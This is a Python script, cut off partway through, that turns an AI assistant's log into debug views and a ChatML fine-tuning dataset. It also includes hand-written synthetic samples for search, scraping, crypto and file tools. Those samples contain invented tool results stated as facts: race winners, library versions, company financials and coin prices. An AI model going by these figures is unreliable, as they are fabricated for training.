"""Create readable and machine-friendly views of ciel_data/logs/thoughts.log.

The raw thoughts.log stays untouched as the chronological audit trail. This
script generates:
  - thoughts_view.md: compact turn-by-turn debug timeline for humans
  - thoughts_view.jsonl: parsed entries for future tooling/RAG ingestion
  - router_finetune.jsonl: Full-pipeline ChatML dataset for Qwen2.5-7B LoRA
    fine-tuning. Each sample captures the complete reasoning chain:
    USER → BRAIN (why) → TOOL (what happened) → WORKER (final answer)
"""

from __future__ import annotations

import argparse
import json
import random
import re
from dataclasses import dataclass, asdict
from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent
DEFAULT_INPUT = ROOT / "ciel_data" / "logs" / "thoughts.log"
DEFAULT_MD = ROOT / "ciel_data" / "logs" / "thoughts_view.md"
DEFAULT_JSONL = ROOT / "ciel_data" / "logs" / "thoughts_view.jsonl"
DEFAULT_TRAIN = ROOT / "ciel_data" / "router_finetune.jsonl"

ENTRY_RE = re.compile(
    r"^\[(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s+"
    r"\[(?P<actor>[^\]]+)\]\s+\[(?P<action>[^\]]+)\]\s*$"
)
SEPARATOR_RE = re.compile(r"^-{20,}\s*$")
CURRENT_REQUEST_RE = re.compile(
    r"\[CURRENT USER REQUEST\]:\s*(?P<request>.*?)(?:\n-{20,}|\Z)",
    re.DOTALL,
)
ROUTE_ACTION_RE = re.compile(r'"action"\s*:\s*"([^"]+)"')
ROUTE_TOOL_RE = re.compile(r'"tool_name"\s*:\s*"([^"]+)"')

# ── Training Dataset Constants ──────────────────────────────────────────────

FAKE_PATHS = [
    r"C:\Projects\AlphaWebApp",
    r"E:\Dev\ReactFrontEnd",
    r"D:\DataAnalysis\PythonServer",
    r"C:\workspace\django_backend",
    r"D:\TradingDesk\mql5_scripts",
    r"C:\Users\Master\Documents\automation_tool",
    r"E:\Workspace\ciel_helper",
    r"D:\GitRepositories\finance_dashboard",
]

TARGET_PATH_PATTERNS = [
    r"D:\\Program Files\\Ciel 2\.0\\Ciel 2\.0",
    r"D:\\Ciel-2\.0",
    r"D:/Ciel-2\.0",
    r"D:\\\\Ciel-2\.0",
]

# Allowed tool names — samples using tools outside this set are dropped
ALLOWED_TOOLS = {
    "save_fact", "get_fact", "delete_fact",
    "list_workspace", "read_file", "write_file", "append_file",
    "delete_file", "get_file_info", "run_python_script",
    "execute_shell_command", "take_screenshot", "open_application",
    "create_gmail_draft", "send_gmail_message", "search_gmail",
    "get_gmail_message", "get_gmail_thread",
    "trash_email", "mark_email_read", "reply_to_email",
    "get_market_price", "get_crypto_stats", "analyze_crypto_technical",
    "git_list_repos", "git_status", "git_diff",
    "git_commit_and_push", "git_confirm_push",
    "vision_act", "vision_describe",
    "stealth_search", "smart_scrape",
}

CIEL_SYSTEM_PROMPT = (
    "You are Ciel, an autonomous AI assistant operating on a Windows desktop. "
    "You have two modes of thinking:\n\n"
    "1. REASONING: When given a user request, first analyze the intent, assess risk, "
    "and decide the correct action (chat / tool / code / multi_tool). Output your "
    "reasoning as a JSON with 'hidden_thought', 'action', and tool details if needed.\n\n"
    "2. EXECUTING: After the action is decided, generate the appropriate response — "
    "either a direct chat answer, formatted tool output, or generated code.\n\n"
    "AVAILABLE TOOLS:\n"
    "- save_fact / get_fact / delete_fact: Local fact vault\n"
    "- list_workspace / read_file / write_file / append_file / delete_file / get_file_info: File ops\n"
    "- run_python_script: Execute Python in sandbox\n"
    "- execute_shell_command: Run OS commands\n"
    "- open_application: Launch programs\n"
    "- search_gmail / create_gmail_draft / send_gmail_message / reply_to_email / trash_email: Email\n"
    "- get_market_price / get_crypto_stats / analyze_crypto_technical: Trading data\n"
    "- git_status / git_diff / git_commit_and_push / git_confirm_push: Git ops\n"
    "- stealth_search / smart_scrape: Web search and scrape\n\n"
    "RULES:\n"
    "- Always reason before acting. Output 'hidden_thought' with observation, reasoning, risk.\n"
    "- Use ONLY tools from the list above. Never invent tool names.\n"
    "- Be extremely concise in final responses. No filler."
)


@dataclass
class LogEntry:
    index: int
    timestamp: str
    actor: str
    action: str
    content: str


# ══════════════════════════════════════════════════════════════════════════════
#  SECTION 1: Log Parsing (shared by all output formats)
# ══════════════════════════════════════════════════════════════════════════════

def parse_log(text: str) -> list[LogEntry]:
    entries: list[LogEntry] = []
    current_header: tuple[str, str, str] | None = None
    current_lines: list[str] = []

    def flush() -> None:
        nonlocal current_header, current_lines
        if not current_header:
            current_lines = []
            return
        timestamp, actor, action = current_header
        content = "\n".join(current_lines).strip()
        entries.append(
            LogEntry(
                index=len(entries) + 1,
                timestamp=timestamp,
                actor=actor,
                action=action,
                content=content,
            )
        )
        current_header = None
        current_lines = []

    for line in text.splitlines():
        header = ENTRY_RE.match(line)
        if header:
            flush()
            current_header = (
                header.group("timestamp"),
                header.group("actor"),
                header.group("action"),
            )
            continue

        if SEPARATOR_RE.match(line):
            flush()
            continue

        if current_header:
            current_lines.append(line)

    flush()
    return entries


# ══════════════════════════════════════════════════════════════════════════════
#  SECTION 2: Debug Markdown + JSONL output (unchanged from original)
# ══════════════════════════════════════════════════════════════════════════════

def group_turns(entries: list[LogEntry]) -> list[dict]:
    turns: list[dict] = []
    pending_prelude: list[LogEntry] = []
    current: dict | None = None

    for entry in entries:
        is_user_request = entry.actor == "USER" and entry.action == "REQUEST"
        if is_user_request:
            if current:
                turns.append(current)
            current = {
                "timestamp": entry.timestamp,
                "request": extract_request(entry.content),
                "entries": pending_prelude + [entry],
            }
            pending_prelude = []
            continue

        if current:
            current["entries"].append(entry)
        elif entry.actor == "RAG" and entry.action in {"RECALLED", "COMPRESSED", "COMPRESS_TASK"}:
            pending_prelude.append(entry)

    if current:
        turns.append(current)

    return turns


def extract_request(content: str) -> str:
    match = CURRENT_REQUEST_RE.search(content)
    if match:
        return compact(match.group("request"), 700)
    return compact(content, 700)


def compact(text: str, limit: int = 500) -> str:
    text = re.sub(r"\s+", " ", text or "").strip()
    if len(text) <= limit:
        return text
    return text[:limit].rstrip() + "..."


def route_summary(content: str) -> str:
    action = ROUTE_ACTION_RE.search(content)
    tool = ROUTE_TOOL_RE.search(content)
    if action and tool:
        return f"{action.group(1)} -> {tool.group(1)}"
    if action:
        return action.group(1)
    return compact(content, 300)


def render_turn(turn: dict, include_full: bool = False) -> str:
    entries: list[LogEntry] = turn["entries"]
    lines = [
        f"## {turn['timestamp']} - User Request",
        "",
        f"> {turn['request']}",
        "",
    ]

    rag_reads = [
        e for e in entries
        if e.actor == "RAG" and e.action in {"RECALLED", "COMPRESS_TASK", "COMPRESSED", "COMPRESS_ERROR"}
    ]
    rag_writes = [
        e for e in entries
        if e.actor == "RAG" and e.action.startswith("ARCHIVED")
    ]
    routes = [e for e in entries if e.actor == "BRAIN" and e.action == "ROUTE_DECISION"]
    tools = [e for e in entries if e.actor == "TOOL"]
    healing = [e for e in entries if e.actor == "HEALING"]
    worker_responses = [
        e for e in entries
        if e.actor == "WORKER" and e.action in {
            "CHAT_RESPONSE",
            "FORMAT_RESPONSE",
            "MULTI_TOOL_FORMAT_RESPONSE",
            "ERROR_REPHRASE",
        }
    ]
    errors = [
        e for e in entries
        if "ERROR" in e.action or "[TOOL_ERROR]" in e.content or "Traceback" in e.content
    ]

    if rag_reads:
        lines.append("**RAG Recall / Compression**")
        for entry in rag_reads:
            lines.append(f"- `{entry.action}` {compact(entry.content, 350)}")
        lines.append("")

    if routes:
        lines.append("**Route**")
        for entry in routes:
            lines.append(f"- `{route_summary(entry.content)}`")
        lines.append("")

    if tools:
        lines.append("**Tools**")
        for entry in tools:
            lines.append(f"- `{entry.action}` {compact(entry.content, 350)}")
        lines.append("")

    if healing:
        lines.append("**Healing**")
        for entry in healing:
            lines.append(f"- `{entry.action}` {compact(entry.content, 350)}")
        lines.append("")

    if worker_responses:
        lines.append("**Final / Worker Output**")
        for entry in worker_responses[-2:]:
            lines.append(f"- {compact(entry.content, 500)}")
        lines.append("")

    if errors:
        lines.append("**Errors To Inspect**")
        for entry in errors:
            lines.append(f"- `{entry.actor}:{entry.action}` {compact(entry.content, 500)}")
        lines.append("")

    if rag_writes:
        lines.append("**Memory Writes**")
        for entry in rag_writes:
            lines.append(f"- `{entry.action}` {compact(entry.content, 300)}")
        lines.append("")

    if include_full:
        lines.append("<details>")
        lines.append("<summary>Full entries</summary>")
        lines.append("")
        for entry in entries:
            lines.append(f"### {entry.timestamp} [{entry.actor}] [{entry.action}]")
            lines.append("")
            lines.append("```text")
            lines.append(entry.content)
            lines.append("```")
            lines.append("")
        lines.append("</details>")
        lines.append("")

    return "\n".join(lines).rstrip() + "\n"


def write_jsonl(entries: list[LogEntry], output_path: Path) -> None:
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with output_path.open("w", encoding="utf-8") as handle:
        for entry in entries:
            handle.write(json.dumps(asdict(entry), ensure_ascii=False) + "\n")


def write_markdown(turns: list[dict], output_path: Path, limit: int, include_full: bool) -> None:
    selected = turns[-limit:] if limit > 0 else turns
    selected = list(reversed(selected))

    total_entries = sum(len(turn["entries"]) for turn in turns)
    lines = [
        "# Ciel Thoughts Log View",
        "",
        "Generated from `ciel_data/logs/thoughts.log`.",
        "The raw log is not modified.",
        "",
        f"- Total turns: {len(turns)}",
        f"- Total parsed entries: {total_entries}",
        f"- Showing newest turns: {len(selected)}",
        "",
    ]

    for turn in selected:
        lines.append(render_turn(turn, include_full=include_full))

    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text("\n".join(lines), encoding="utf-8")


# ══════════════════════════════════════════════════════════════════════════════
#  SECTION 3: Full-Pipeline Training Dataset (ChatML for Qwen2.5-7B)
#
#  Each sample is a MULTI-TURN conversation that teaches the model
#  the complete reasoning chain:
#
#    [system] Ciel persona + tool list
#    [user]   Raw user request
#    [assistant] Brain reasoning (hidden_thought + action decision)
#    [user]   Tool result (if tool action)  — or skip this turn for chat
#    [assistant] Worker's final response to the user
#
#  This teaches the model WHY (reasoning) not just WHAT (output).
# ══════════════════════════════════════════════════════════════════════════════

def _clean_user_request(text: str) -> str:
    """Clean the user request, keeping any RAG recalled context intact for RAG-awareness."""
    return text.strip()


def _clean_route_json(text: str) -> str:
    """Strip markdown code fences from route decision JSON."""
    cleaned = re.sub(r"```json\s*", "", text, flags=re.IGNORECASE)
    cleaned = re.sub(r"```\s*$", "", cleaned)
    return cleaned.strip()


def _randomize_paths_str(text: str) -> str:
    """Replace hardcoded project paths with a random fake path."""
    random_path = random.choice(FAKE_PATHS)
    for pattern in TARGET_PATH_PATTERNS:
        if re.search(pattern, text, re.IGNORECASE):
            swapped = random_path
            if "/" in pattern:
                swapped = random_path.replace("\\", "/")
            elif "\\\\\\\\" in pattern:
                swapped = random_path.replace("\\", "\\\\")
            repl = lambda _m: swapped
            text = re.sub(pattern, repl, text, flags=re.IGNORECASE)
    return text


def _extract_tools_from_decision(decision_obj: dict) -> list[str]:
    """Get all tool_name values from a route decision."""
    names = []
    if "tool_name" in decision_obj:
        names.append(decision_obj["tool_name"])
    for t in decision_obj.get("tools", []):
        if isinstance(t, dict) and "tool_name" in t:
            names.append(t["tool_name"])
    return names


def _truncate_content(text: str, max_chars: int = 1500) -> str:
    """Truncate very long content (e.g. email bodies) to keep training
    samples within a reasonable token budget for the 2048 seq_len."""
    if len(text) <= max_chars:
        return text
    return text[:max_chars].rstrip() + "\n[... truncated]"


def build_training_dataset(entries: list[LogEntry]) -> tuple[list[dict], dict]:
    """Walk through parsed log entries and build multi-turn ChatML samples
    that capture the full reasoning pipeline.

    Returns (dataset, stats_dict).
    """
    dataset: list[dict] = []
    stats = {
        "total_turns": 0,
        "kept": 0,
        "dropped_invalid_json": 0,
        "dropped_bad_tool": 0,
        "dropped_no_response": 0,
        "by_action": {},
    }

    # Group entries into turns (USER REQUEST → next USER REQUEST)
    turns: list[list[LogEntry]] = []
    current_turn: list[LogEntry] = []

    for entry in entries:
        if entry.actor == "USER" and entry.action == "REQUEST":
            if current_turn:
                turns.append(current_turn)
            current_turn = [entry]
        elif current_turn:
            current_turn.append(entry)
    if current_turn:
        turns.append(current_turn)

    stats["total_turns"] = len(turns)

    for turn_entries in turns:
        # Find key components
        user_entry = turn_entries[0]
        user_request = _clean_user_request(user_entry.content)
        if not user_request:
            continue

        # Find ROUTE_DECISION
        route_entry = None
        for e in turn_entries:
            if e.actor == "BRAIN" and e.action == "ROUTE_DECISION":
                route_entry = e
                break
        if not route_entry:
            continue

        # Parse route JSON
        decision_str = _clean_route_json(route_entry.content)
        try:
            decision_obj = json.loads(decision_str)
        except json.JSONDecodeError:
            stats["dropped_invalid_json"] += 1
            continue

        # Check for hallucinated tools
        tool_names = _extract_tools_from_decision(decision_obj)
        bad_tools = [t for t in tool_names if t not in ALLOWED_TOOLS]
        if bad_tools:
            stats["dropped_bad_tool"] += 1
            continue

        action_type = decision_obj.get("action", "chat")
        stats["by_action"][action_type] = stats["by_action"].get(action_type, 0) + 1

        # Build the multi-turn message sequence
        messages: list[dict] = [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": _randomize_paths_str(user_request)},
        ]

        # Turn 1 — Brain's reasoning + action decision (the "WHY")
        clean_decision = json.dumps(decision_obj, ensure_ascii=False)
        clean_decision = _randomize_paths_str(clean_decision)
        messages.append({"role": "assistant", "content": clean_decision})

        # Turn 2+ — depends on action type
        if action_type == "chat":
            # Find CHAT_RESPONSE
            chat_resp = None
            for e in turn_entries:
                if e.actor == "WORKER" and e.action == "CHAT_RESPONSE":
                    chat_resp = e
                    break
            if chat_resp:
                # Add the chat task as context, then the response
                messages.append({"role": "user", "content": "Now generate the response."})
                messages.append({"role": "assistant", "content": _truncate_content(chat_resp.content)})
            else:
                stats["dropped_no_response"] += 1
                continue

        elif action_type == "tool":
            # Find TOOL RESULT and WORKER FORMAT_RESPONSE
            tool_result = None
            worker_resp = None
            for e in turn_entries:
                if e.actor == "TOOL" and e.action == "RESULT":
                    tool_result = e
                if e.actor == "WORKER" and e.action == "FORMAT_RESPONSE":
                    worker_resp = e

            if tool_result:
                messages.append({
                    "role": "user",
                    "content": f"Tool returned:\n{_truncate_content(tool_result.content)}"
                })
                if worker_resp:
                    messages.append({"role": "assistant", "content": _truncate_content(worker_resp.content)})
                else:
                    # Some tool results go directly to user without Worker formatting
                    messages.append({"role": "assistant", "content": _truncate_content(tool_result.content)})
            # If no tool result at all, just keep the reasoning turn

        elif action_type == "code":
            # Find CODE_RESPONSE
            code_resp = None
            for e in turn_entries:
                if e.actor == "WORKER" and e.action == "CODE_RESPONSE":
                    code_resp = e
                    break
            if code_resp:
                messages.append({"role": "user", "content": "Generate the code now."})
                messages.append({"role": "assistant", "content": _truncate_content(code_resp.content)})

        elif action_type == "multi_tool":
            # Find all TOOL RESULTs and final MULTI_TOOL_FORMAT_RESPONSE
            tool_results = []
            multi_resp = None
            for e in turn_entries:
                if e.actor == "TOOL" and e.action.startswith("RESULT"):
                    tool_results.append(e)
                if e.actor == "WORKER" and e.action == "MULTI_TOOL_FORMAT_RESPONSE":
                    multi_resp = e

            if tool_results:
                combined = "\n---\n".join(
                    f"[{e.action}] {_truncate_content(e.content, 800)}"
                    for e in tool_results
                )
                messages.append({"role": "user", "content": f"Tool results:\n{combined}"})
                if multi_resp:
                    messages.append({"role": "assistant", "content": _truncate_content(multi_resp.content)})

        dataset.append({"messages": messages})
        stats["kept"] += 1

    # ── Synthetic Dataset Augmentation ───────────────────────────────────────
    syn_samples = get_synthetic_samples()
    for sample in syn_samples:
        dataset.append(sample)
        stats["kept"] += 1
        
        # Update by_action stats
        try:
            decision_str = sample["messages"][2]["content"]
            decision_obj = json.loads(decision_str)
            action_type = decision_obj.get("action", "chat")
            stats["by_action"][action_type] = stats["by_action"].get(action_type, 0) + 1
        except Exception:
            pass

    return dataset, stats


def get_synthetic_samples() -> list[dict]:
    """Generate 47 high-fidelity synthetic multi-turn ChatML training samples.
    Covers the 9 low-coverage tools, refusal safety cases, RAG scenarios, and complex multi-tool sequences.
    """
    synthetic = []

    # ══════════════════════════════════════════════════════════════════════════
    #  1. STEALTH_SEARCH (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Who won the latest Monaco Grand Prix?"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to find out who won the latest Monaco Grand Prix in 2026.",
                    "reasoning": "Since this requires real-time 2026 sports news that is not in my static training weights, I will search the web using the stealth_search tool.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "stealth_search",
                "tool_args": {"query": "Monaco Grand Prix winner 2026"},
                "response_hint": "Looking up the Monaco Grand Prix 2026 winner..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSearch Results for 'Monaco Grand Prix winner 2026':\n1. Title: Formula 1 Monaco GP 2026\n   URL: https://formula1.com/monaco-2026\n   Snippet: Charles Leclerc drives to a legendary home victory at the 2026 Monaco Grand Prix."},
            {"role": "assistant", "content": "Charles Leclerc won the 2026 Monaco Grand Prix."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Check PyPI or search the web for the latest stable pandas version in 2026."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is asking for the latest stable release version of the pandas library in 2026.",
                    "reasoning": "To get the most accurate, live package version from PyPI, I must perform a web search using stealth_search.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "stealth_search",
                "tool_args": {"query": "latest stable pandas version 2026"},
                "response_hint": "Checking the latest pandas stable version..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSearch Results for 'latest stable pandas version 2026':\n1. Title: pandas - PyPI\n   URL: https://pypi.org/project/pandas\n   Snippet: pandas 2.5.4 stable released on April 12, 2026, with major speed improvements."},
            {"role": "assistant", "content": "The latest stable version of pandas in 2026 is 2.5.4."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "What is the weather in Hanoi right now?"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to check the current weather in Hanoi.",
                    "reasoning": "Weather is real-time meteorological data. I must use the stealth_search tool to fetch the current forecast.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "stealth_search",
                "tool_args": {"query": "current weather in Hanoi today"},
                "response_hint": "Fetching live weather for Hanoi..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSearch Results for 'current weather in Hanoi today':\n1. Title: Hanoi, Vietnam Weather\n   URL: https://weather.com/hanoi\n   Snippet: Currently in Hanoi: 28°C, Cloudy with 80% humidity, light rain expected in the evening."},
            {"role": "assistant", "content": "Master, it is currently 28°C and cloudy in Hanoi, with 80% humidity."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  2. SMART_SCRAPE (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Scrape the full details of TwelveData API usage from their page: https://twelvedata.com/docs"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants me to extract the full contents of TwelveData API documentation from the specified URL.",
                    "reasoning": "I need to read the full page content to understand the details. The smart_scrape tool will extract clean Markdown from the URL.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "smart_scrape",
                "tool_args": {"url": "https://twelvedata.com/docs"},
                "response_hint": "Scraping TwelveData API documentation..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\n# TwelveData API Documentation\n\n## Endpoint: /price\nReturns the real-time price of stocks, forex, metals, and crypto.\n\n### Parameters:\n- symbol (required)\n- apikey (required)"},
            {"role": "assistant", "content": "Master, TwelveData's `/price` endpoint retrieves real-time quotes for stocks, forex, metals, and crypto using `symbol` and `apikey` parameters."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Read and scrape the main financial highlights from https://ir.tesla.com/tesla-q1-2026-financials"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to extract the Tesla Q1 2026 financial report highlights.",
                    "reasoning": "Since this requires detailed reading of a specific webpage, I will use smart_scrape to pull the text.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "smart_scrape",
                "tool_args": {"url": "https://ir.tesla.com/tesla-q1-2026-financials"},
                "response_hint": "Scraping Tesla's Q1 2026 financial page..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\n# Tesla Q1 2026 Financial Results\n- Revenue: $25.8 Billion (+8% YoY)\n- Operating Margin: 12.4%\n- Free Cash Flow: $3.1 Billion"},
            {"role": "assistant", "content": "In Q1 2026, Tesla reported $25.8 Billion in revenue (+8% YoY), a 12.4% operating margin, and $3.1 Billion in Free Cash Flow."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Extract the contents of this web page for me: https://example.com/api-pricing"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is requesting to extract contents from a specific web URL.",
                    "reasoning": "The smart_scrape tool is the designated tool to read and convert an exact URL to clean markdown text.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "smart_scrape",
                "tool_args": {"url": "https://example.com/api-pricing"},
                "response_hint": "Scraping the API pricing details..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\n# API Pricing\n- Developer: Free (100 req/day)\n- Pro: $49/mo (10,000 req/day)\n- Enterprise: Custom"},
            {"role": "assistant", "content": "The API pricing has three tiers: Developer is Free (100 req/day), Pro is $49/month (10,000 req/day), and Enterprise is Custom."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  3. ANALYZE_CRYPTO_TECHNICAL (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Run a technical analysis on BTC/USDT using the 1h timeframe."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is requesting technical analysis for BTC/USDT on the 1h interval.",
                    "reasoning": "The analyze_crypto_technical tool calculates moving averages, RSI, and trends for cryptocurrencies using Binance data.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "analyze_crypto_technical",
                "tool_args": {"symbol": "BTC/USDT", "interval": "1h"},
                "response_hint": "Calculating 1h technical indicators for Bitcoin..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nKỹ thuật BTCUSDT (1h): Giá 68245.50, RSI: 52.34 (TRUNG TÍNH), MA(5,30): 68120.00, 68050.00, Xu hướng: TĂNG (Bullish)"},
            {"role": "assistant", "content": "BTC/USDT is Bullish on the 1h timeframe at $68,245.50 (RSI 52.34 - Neutral, MA5 > MA30)."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Calculate the technicals for Ethereum on a 4h interval."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants technical analysis for Ethereum (ETH) on a 4-hour timeframe.",
                    "reasoning": "Since Ethereum is a cryptocurrency, the analyze_crypto_technical tool is ideal to pull Binance klines and compute the indicators.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "analyze_crypto_technical",
                "tool_args": {"symbol": "ETH/USDT", "interval": "4h"},
                "response_hint": "Fetching 4h technical charts for Ethereum..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nKỹ thuật ETHUSDT (4h): Giá 3450.25, RSI: 74.20 (QUÁ MUA), MA(5,30): 3480.00, 3320.00, Xu hướng: TĂNG (Bullish)"},
            {"role": "assistant", "content": "Ethereum (ETH) is Bullish on the 4h interval at $3,450.25, but currently registers as Overbought (RSI: 74.20)."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Check indicators and trend for SOL using the 15m timeframe."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants 15-minute indicators and trend for Solana (SOL).",
                    "reasoning": "I will run analyze_crypto_technical with 'SOL/USDT' and interval '15m' to get instant technical statistics.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "analyze_crypto_technical",
                "tool_args": {"symbol": "SOL/USDT", "interval": "15m"},
                "response_hint": "Running technical calculations for Solana..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nKỹ thuật SOLUSDT (15m): Giá 152.40, RSI: 28.10 (QUÁ BÁN), MA(5,30): 151.80, 153.20, Xu hướng: GIẢM (Bearish)"},
            {"role": "assistant", "content": "Solana (SOL) is currently Bearish on the 15m interval at $152.40, and is trading in Oversold territory (RSI: 28.10)."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  4. GET_CRYPTO_STATS (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "What are the 24h stats for Binance Coin (BNB)?"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants 24h trading statistics for Binance Coin (BNB).",
                    "reasoning": "Since this is crypto-specific 24h statistics (high, low, percent change), get_crypto_stats is the correct and fastest tool.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "get_crypto_stats",
                "tool_args": {"symbol": "BNB"},
                "response_hint": "Fetching 24h market stats for BNB..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nStats BNBUSDT: Price=585.40, Change=+3.21%, High=592.00, Low=564.50"},
            {"role": "assistant", "content": "Binance Coin (BNB) stats: Price $585.40 (+3.21% in 24h), High $592.00, Low $564.50."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Get the 24h high and low prices for Ripple (XRP)."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is requesting 24-hour high and low trading data for Ripple (XRP).",
                    "reasoning": "The get_crypto_stats tool pulls public 24-hour pricing thresholds from Binance for the symbol XRP.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "get_crypto_stats",
                "tool_args": {"symbol": "XRP"},
                "response_hint": "Retrieving 24h thresholds for Ripple..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nStats XRPUSDT: Price=0.5840, Change=-1.12%, High=0.5980, Low=0.5720"},
            {"role": "assistant", "content": "Ripple (XRP) is at $0.5840 (-1.12%), with a 24h High of $0.5980 and Low of $0.5720."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Give me the 24h statistics for Cardano (ADA)."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is asking for 24h market data for Cardano (ADA).",
                    "reasoning": "The get_crypto_stats tool is designed to fetch 24h stats for Cardano using the public Binance API.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "get_crypto_stats",
                "tool_args": {"symbol": "ADA"},
                "response_hint": "Fetching market statistics for Cardano..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nStats ADAUSDT: Price=0.485, Change=+5.45%, High=0.510, Low=0.450"},
            {"role": "assistant", "content": "Cardano (ADA) is trading at $0.485 (+5.45%), with a 24h High of $0.510 and Low of $0.450."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  5. APPEND_FILE (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Append the line 'Initialization successful' to workspace log file system.log."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to append a specific log message to system.log in the workspace.",
                    "reasoning": "To append text to an existing file without wiping its contents, I must call the append_file tool.",
                    "risk": "file overwrite"
                },
                "action": "tool",
                "tool_name": "append_file",
                "tool_args": {"filename": "system.log", "content": "Initialization successful\n"},
                "response_hint": "Appending status to system.log..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSuccessfully appended content to system.log."},
            {"role": "assistant", "content": "Master, I have appended 'Initialization successful' to system.log."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Add 'ciel_private/*' to my ignore file called .gitignore in the workspace."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to add an ignore entry to .gitignore in the workspace.",
                    "reasoning": "This is an edit that appends text to an existing configuration file. I will use the append_file tool.",
                    "risk": "file overwrite"
                },
                "action": "tool",
                "tool_name": "append_file",
                "tool_args": {"filename": ".gitignore", "content": "\nciel_private/*\n"},
                "response_hint": "Appending ignore rules to .gitignore..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSuccessfully appended content to .gitignore."},
            {"role": "assistant", "content": "Master, I added 'ciel_private/*' to your .gitignore."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Append the text 'Session complete' to the end of workspace file status_report.txt."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to append a string to the end of status_report.txt.",
